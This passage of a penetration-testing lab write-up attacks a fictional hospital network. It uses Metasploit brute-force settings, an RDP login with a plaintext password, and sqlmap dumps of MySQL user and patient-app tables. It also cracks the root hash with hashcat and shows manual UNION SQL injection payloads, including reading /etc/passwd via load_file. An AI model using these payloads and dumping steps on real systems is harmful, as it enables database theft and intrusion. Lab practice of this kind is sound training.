+<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="nb">set</span> USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
+<a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="nb">set</span> PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+</code></pre></div>
+<blockquote>
+<p>What type of attack that allows privilege escalation is the FTP server vulnerable to?</p>
+</blockquote>
+<p><code>DLL Hijacking</code></p>
+<p>use auxiliary/scanner/portscan/syn</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>msf auxiliary<span class="o">(</span>scanner/portscan/syn<span class="o">)</span> &gt; run
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="o">[</span>+<span class="o">]</span>  TCP OPEN <span class="m">10</span>.102xxxxx:3389
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="o">[</span>+<span class="o">]</span>  TCP OPEN <span class="m">10</span>.102xxxxx:5985
+</code></pre></div>
+<p>additional <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp">https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp</a></p>
+<p><a href="https://www.kali.org/tools/rdesktop/">https://www.kali.org/tools/rdesktop/</a></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>rdesktop -u &lt;username&gt; &lt;IP&gt;
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>rdesktop -u douglas <span class="m">10</span>.102.10.50
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>Subject: <span class="nv">CN</span><span class="o">=</span>test-pc.armsdon.hospital.local
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>     Issuer: <span class="nv">CN</span><span class="o">=</span>test-pc.armsdon.hospital.local
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>rdesktop -d &lt;domain&gt; -u &lt;username&gt; -p &lt;password&gt; &lt;IP&gt;
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>
+<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>rdesktop -d armsdon.hospital.local -u douglas -p <span class="s1">&#39;1m1ghtbwrong?&#39;</span> <span class="m">10</span>.102.10.50
+</code></pre></div>
+<hr />
+<h2 id="intranet">intranet</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>nmap -sS -sC -sV <span class="m">10</span>.Xxxxx
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>Starting Nmap <span class="m">7</span>.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at <span class="m">2022</span>-08-15 <span class="m">19</span>:46 UTC                                                                     
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>Nmap scan report <span class="k">for</span> ip-10-102-9-67.eu-west-1.compute.internal <span class="o">(</span><span class="m">10</span>.XXXXX<span class="o">)</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>Host is up <span class="o">(</span><span class="m">0</span>.000077s latency<span class="o">)</span>.                                                                                                            
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>Not shown: <span class="m">999</span> closed ports                                                                                                                
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>PORT   STATE SERVICE VERSION                                                                                                                     
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="m">80</span>/tcp open  http    Apache httpd <span class="m">2</span>.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="p">|</span> http-title: QualityCare
+<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="p">|</span>_Requested resource was http://ip-10-XXXXXXXXXX.eu-west-1.compute.internal/login
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>sqlmap exploit
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>sqlmap --help
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>sqlmap -u <span class="si">${</span><span class="nv">URL</span><span class="si">}</span> --batch --banner
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>back-end DBMS is MySQL
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>back-end DBMS operating system: Linux Ubuntu
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>back-end DBMS: MySQL &gt;<span class="o">=</span> <span class="m">5</span>.0.12
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>banner: <span class="s1">&#39;10.1.44-MariaDB-0ubuntu0.18.04.1&#39;</span>
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>available databases <span class="o">[</span><span class="m">4</span><span class="o">]</span>:
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="o">[</span>*<span class="o">]</span> information_schema
+<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="o">[</span>*<span class="o">]</span> mysql
+<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="o">[</span>*<span class="o">]</span> performance_schema
+<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="o">[</span>*<span class="o">]</span> qualitycare
+</code></pre></div>
+<p><code>sqlmap -u URL --batch --passwords</code></p>
+<p>database management system users password hashes:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="o">[</span>*<span class="o">]</span> root <span class="o">[</span><span class="m">1</span><span class="o">]</span>:
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>    password hash: NULL
+</code></pre></div>
+<p>time-base blind attach is <strong>SUPER SLOW</strong>, so narrowing it down to a single DB, possible table and better limit to column as well</p>
+<p><code>sqlmap -u ${URL} --batch -D mysql --dump</code></p>
+<p>find available databases</p>
+<p><code>sqlmap -u ${URL} --batch --dbs</code></p>
+<p>find the tables in the specific database</p>
+<p><code>sqlmap -u ${URL} --batch -D mysql --tables</code></p>
+<p><code>sqlmap -u ${URL} --batch -D qualitycare --tables</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>Database: mysql
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="o">[</span><span class="m">30</span> tables<span class="o">]</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>+---------------------------+
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="p">|</span> user                      <span class="p">|</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="p">|</span> column_stats              <span class="p">|</span>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="p">|</span> columns_priv              <span class="p">|</span>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="p">|</span> db                        <span class="p">|</span>
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="p">|</span> event                     <span class="p">|</span>
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="p">|</span> func                      <span class="p">|</span>
+<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="p">|</span> general_log               <span class="p">|</span>
+<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="p">|</span> gtid_slave_pos            <span class="p">|</span>
+<a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a><span class="p">|</span> help_category             <span class="p">|</span>
+<a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a><span class="p">|</span> help_keyword              <span class="p">|</span>
+<a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a><span class="p">|</span> help_relation             <span class="p">|</span>
+<a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a><span class="p">|</span> help_topic                <span class="p">|</span>
+<a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a><span class="p">|</span> host                      <span class="p">|</span>
+<a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a><span class="p">|</span> index_stats               <span class="p">|</span>
+<a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a><span class="p">|</span> innodb_index_stats        <span class="p">|</span>
+<a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a><span class="p">|</span> innodb_table_stats        <span class="p">|</span>
+<a id="__codelineno-7-20" name="__codelineno-7-20" href="#__codelineno-7-20"></a><span class="p">|</span> plugin                    <span class="p">|</span>
+<a id="__codelineno-7-21" name="__codelineno-7-21" href="#__codelineno-7-21"></a><span class="p">|</span> proc                      <span class="p">|</span>
+<a id="__codelineno-7-22" name="__codelineno-7-22" href="#__codelineno-7-22"></a><span class="p">|</span> procs_priv                <span class="p">|</span>
+<a id="__codelineno-7-23" name="__codelineno-7-23" href="#__codelineno-7-23"></a><span class="p">|</span> proxies_priv              <span class="p">|</span>
+<a id="__codelineno-7-24" name="__codelineno-7-24" href="#__codelineno-7-24"></a><span class="p">|</span> roles_mapping             <span class="p">|</span>
+<a id="__codelineno-7-25" name="__codelineno-7-25" href="#__codelineno-7-25"></a><span class="p">|</span> servers                   <span class="p">|</span>
+<a id="__codelineno-7-26" name="__codelineno-7-26" href="#__codelineno-7-26"></a><span class="p">|</span> slow_log                  <span class="p">|</span>
+<a id="__codelineno-7-27" name="__codelineno-7-27" href="#__codelineno-7-27"></a><span class="p">|</span> table_stats               <span class="p">|</span>
+<a id="__codelineno-7-28" name="__codelineno-7-28" href="#__codelineno-7-28"></a><span class="p">|</span> tables_priv               <span class="p">|</span>
+<a id="__codelineno-7-29" name="__codelineno-7-29" href="#__codelineno-7-29"></a><span class="p">|</span> time_zone                 <span class="p">|</span>
+<a id="__codelineno-7-30" name="__codelineno-7-30" href="#__codelineno-7-30"></a><span class="p">|</span> time_zone_leap_second     <span class="p">|</span>
+<a id="__codelineno-7-31" name="__codelineno-7-31" href="#__codelineno-7-31"></a><span class="p">|</span> time_zone_name            <span class="p">|</span>
+<a id="__codelineno-7-32" name="__codelineno-7-32" href="#__codelineno-7-32"></a><span class="p">|</span> time_zone_transition      <span class="p">|</span>
+<a id="__codelineno-7-33" name="__codelineno-7-33" href="#__codelineno-7-33"></a><span class="p">|</span> time_zone_transition_type <span class="p">|</span>
+<a id="__codelineno-7-34" name="__codelineno-7-34" href="#__codelineno-7-34"></a>+---------------------------+
+</code></pre></div>
+<p>find the columns on the specific table, on the specific database</p>
+<p><code>sqlmap -u ${URL} --batch -D mysql -T user --columns</code></p>
+<p>dump the selected values</p>
+<p><code>sqlmap -u ${URL} --batch -D mysql -T user -C User,Password --dump</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>Database: mysql
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>Table: user
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="o">[</span><span class="m">1</span> entry<span class="o">]</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>+--------+-------------------------------------------+
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="p">|</span> User   <span class="p">|</span> Password                                  <span class="p">|</span>
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>+--------+-------------------------------------------+
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="p">|</span> root   <span class="p">|</span> *4D4660866D8BB729116A6BBE5913441937DF1432 <span class="p">|</span>
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>+--------+-------------------------------------------+
+</code></pre></div>
+<hr />
+<h2 id="hashcat">hashcat</h2>
+<p>root password is using old MySQL hash encryption</p>
+<p>hashcat using GPUs to crack hashes</p>
+<p><a href="https://www.sans.org/blog/password-hash-cracking-amazon-web-services/">https://www.sans.org/blog/password-hash-cracking-amazon-web-services/</a></p>
+<p>Good detailed explanation here <a href="https://youtu.be/IwthyvvcqzY">https://youtu.be/IwthyvvcqzY</a> - <code>Crack MySQL - SHA1 / SHA2 passwords using the Hashcat tool</code></p>
+<p>hashcat help</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>hashcat --help
+</code></pre></div>
+<p>benchmark module 300, <code>MySQL4.1/MySQL5</code>, Database Server</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>hashcat -m <span class="m">300</span> -b
+</code></pre></div>
+<p>other sample of using hashcat command</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>hashcat -O -m <span class="m">300</span> -a <span class="m">3</span> --increment --increment-min <span class="m">1</span> --increment-max <span class="m">12</span> hash-this.txt ?a?a?a?a?a?a?a?a?a?a?a?a
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>hashcat -O -m <span class="m">300</span> -a <span class="m">3</span> --increment --increment-min <span class="m">1</span> --increment-max <span class="m">12</span> hash-this.txt ?d?d?d?d?d?d?d?d?d?d?d?d
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>hashcat -O -m <span class="m">300</span> -a <span class="m">3</span> --increment --increment-min <span class="m">1</span> --increment-max <span class="m">12</span> hash-this.txt ?l?u?d?l?u?d?l?u?d?l?u?d?l?u?d?l?u?d?l?u?d?l?u?d?l?u?d?l?u?d?l?u?d?l?u?d
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>hashcat -O -m <span class="m">300</span> -a <span class="m">3</span> hash-this.txt
+</code></pre></div>
+<p><a href="https://www.percona.com/blog/2020/06/12/brute-force-mysql-password-from-a-hash/">https://www.percona.com/blog/2020/06/12/brute-force-mysql-password-from-a-hash/</a></p>
+<p><a href="https://github.com/kkrypt0nn/wordlists">https://github.com/kkrypt0nn/wordlists</a></p>
+<p><a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords">https://github.com/danielmiessler/SecLists/tree/master/Passwords</a></p>
+<hr />
+<p>checking other databases and their tables</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>sqlmap -u <span class="si">${</span><span class="nv">URL</span><span class="si">}</span> --batch -D qualitycare --tables
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>Database: qualitycare
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="o">[</span><span class="m">3</span> tables<span class="o">]</span>
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>+-----------+
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="p">|</span> hospitals <span class="p">|</span>
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="p">|</span> patients  <span class="p">|</span>
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="p">|</span> users     <span class="p">|</span>
+<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>+-----------+
+</code></pre></div>
+<p>checking which columns we have in this specific table in this specific database</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>sqlmap -u <span class="si">${</span><span class="nv">URL</span><span class="si">}</span> --batch -D qualitycare -T users --columns
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>Database: qualitycare
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>Table: users
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="o">[</span><span class="m">5</span> columns<span class="o">]</span>
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>+-------------+--------------+
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="p">|</span> Column      <span class="p">|</span> Type         <span class="p">|</span>
+<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>+-------------+--------------+
+<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="p">|</span> email       <span class="p">|</span> varchar<span class="o">(</span><span class="m">75</span><span class="o">)</span>  <span class="p">|</span>
+<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="p">|</span> hospital_id <span class="p">|</span> int<span class="o">(</span><span class="m">11</span><span class="o">)</span>      <span class="p">|</span>
+<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="p">|</span> id          <span class="p">|</span> int<span class="o">(</span><span class="m">11</span><span class="o">)</span>      <span class="p">|</span>
+<a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a><span class="p">|</span> password    <span class="p">|</span> varchar<span class="o">(</span><span class="m">255</span><span class="o">)</span> <span class="p">|</span>
+<a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a><span class="p">|</span> username    <span class="p">|</span> varchar<span class="o">(</span><span class="m">75</span><span class="o">)</span>  <span class="p">|</span>
+<a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a>+-------------+--------------+
+</code></pre></div>
+<p>dump the selected values</p>
+<p><code>sqlmap -u ${URL} --batch -D qualitycare -T users -C email,hospital_id,id,password,username --dump</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>Database: qualitycare
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>Table: users
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="o">[</span><span class="m">21</span> entries<span class="o">]</span>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>+-------------------------------------------+-------------+----+-----------------------+-------------------+
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="p">|</span> email                                     <span class="p">|</span> hospital_id <span class="p">|</span> id <span class="p">|</span> password              <span class="p">|</span> username          <span class="p">|</span>
+<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>+-------------------------------------------+-------------+----+-----------------------+-------------------+
+<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="o">(</span>....<span class="o">)</span>
+<a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="o">(</span>....<span class="o">)</span>
+<a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="o">(</span>....<span class="o">)</span>
+<a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a>+-------------------------------------------+-------------+----+-----------------------+-------------------+
+</code></pre></div>
+<p>checking other tables and columns</p>
+<p><code>sqlmap -u ${URL} --batch -D qualitycare -T hospitals --columns</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>Database: qualitycare
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>Table: hospitals
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="o">[</span><span class="m">2</span> columns<span class="o">]</span>
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>+--------+--------------+
+<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="p">|</span> Column <span class="p">|</span> Type         <span class="p">|</span>
+<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>+--------+--------------+
+<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="p">|</span> id     <span class="p">|</span> int<span class="o">(</span><span class="m">11</span><span class="o">)</span>      <span class="p">|</span>
+<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="p">|</span> name   <span class="p">|</span> varchar<span class="o">(</span><span class="m">255</span><span class="o">)</span> <span class="p">|</span>
+<a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>+--------+--------------+
+</code></pre></div>
+<ul>
+<li>dump the selected values</li>
+</ul>
+<p><code>sqlmap -u ${URL} --batch -D qualitycare -T hospitals -C id,name --dump</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>Database: qualitycare
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>Table: hospitals
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="o">[</span><span class="m">4</span> entries<span class="o">]</span>
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>+----+-------------------+
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="p">|</span> id <span class="p">|</span> name              <span class="p">|</span>
+<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>+----+-------------------+
+<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="p">|</span> <span class="m">1</span>  <span class="p">|</span> armsdon           <span class="p">|</span>
+<a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a><span class="p">|</span> <span class="m">2</span>  <span class="p">|</span> tadfield          <span class="p">|</span>
+<a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a><span class="p">|</span> <span class="m">3</span>  <span class="p">|</span> walmington-on-sea <span class="p">|</span>
+<a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a><span class="p">|</span> <span class="m">4</span>  <span class="p">|</span> fitton            <span class="p">|</span>
+<a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a>+----+-------------------+
+</code></pre></div>
+<p>After login with valid user, we can see that is still possible to run a <code>SQL UNION</code> injection attack</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="s1">&#39; ORDER by 9 #</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="s1">&#39;</span> UNION SELECT <span class="m">1</span>,2,3,4,5,6,7,8,group_concat<span class="o">(</span>table_name<span class="o">)</span> FROM information_schema.tables WHERE <span class="nv">table_schema</span><span class="o">=</span>database<span class="o">()</span><span class="c1">#</span>
+<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>
+<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>&gt; hospitals,patients,users
+<a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>
+<a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>
+<a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a><span class="s1">&#39; UNION SELECT 1,2,User,Password,5,6,7,8,9 FROM mysql.user WHERE user=&quot;root&quot;#</span>
+<a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>
+<a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a><span class="s1">&#39;</span> UNION SELECT <span class="m">1</span>,2,User,Password,5,6,7,8,9 FROM mysql.user#
+<a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>
+<a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a><span class="s1">&#39; UNION SELECT 1,Password,User,4,5,6,7,8,9 FROM mysql.user WHERE user=&quot;root&quot;#</span>
+<a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a>
+<a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a>
+<a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a><span class="s1">additional info - https://resources.infosecinstitute.com/topic/anatomy-of-an-attack-gaining-reverse-shell-from-sql-injection/</span>
+<a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a>
+<a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a><span class="s1">&#39;</span> UNION SELECT <span class="m">1</span>,user<span class="o">()</span>,database<span class="o">()</span>,version<span class="o">()</span>,5,6,7,8,9 <span class="c1">#</span>
+<a id="__codelineno-17-18" name="__codelineno-17-18" href="#__codelineno-17-18"></a>
+<a id="__codelineno-17-19" name="__codelineno-17-19" href="#__codelineno-17-19"></a>qualitycare
+<a id="__codelineno-17-20" name="__codelineno-17-20" href="#__codelineno-17-20"></a>root@localhost 
+<a id="__codelineno-17-21" name="__codelineno-17-21" href="#__codelineno-17-21"></a>
+<a id="__codelineno-17-22" name="__codelineno-17-22" href="#__codelineno-17-22"></a>session_user<span class="o">()</span>,current_user<span class="o">()</span>:
+<a id="__codelineno-17-23" name="__codelineno-17-23" href="#__codelineno-17-23"></a>
+<a id="__codelineno-17-24" name="__codelineno-17-24" href="#__codelineno-17-24"></a>version<span class="o">()</span>
+<a id="__codelineno-17-25" name="__codelineno-17-25" href="#__codelineno-17-25"></a>
+<a id="__codelineno-17-26" name="__codelineno-17-26" href="#__codelineno-17-26"></a>load_file<span class="o">(</span>/etc/passwd<span class="o">)</span>
+<a id="__codelineno-17-27" name="__codelineno-17-27" href="#__codelineno-17-27"></a>
+<a id="__codelineno-17-28" name="__codelineno-17-28" href="#__codelineno-17-28"></a><span class="s1">&#39; UNION SELECT 1,2,load_file(/etc/passwd),4,5,6,7,8,9 #    &lt;--this might now work if the `load_file` is disabled on the server.</span>
+<a id="__codelineno-17-29" name="__codelineno-17-29" href="#__codelineno-17-29"></a>
+<a id="__codelineno-17-30" name="__codelineno-17-30" href="#__codelineno-17-30"></a><span class="s1">&#39;</span> UNION SELECT <span class="m">1</span>,current_user<span class="o">()</span>,session_user<span class="o">()</span>,4,5,6,7,8,9 <span class="c1">#</span>
+</code></pre></div>
+<hr />
+<h2 id="testing-sqlmap-with-user-authenticantion">testing SQLmap with user authenticantion</h2>
+<ul>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap">https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap</a></li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>-u <span class="s2">&quot;&lt;URL&gt;&quot;</span> 
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>-p <span class="s2">&quot;&lt;PARAM TO TEST&gt;&quot;</span> 
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>--user-agent<span class="o">=</span>SQLMAP 
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>--random-agent 
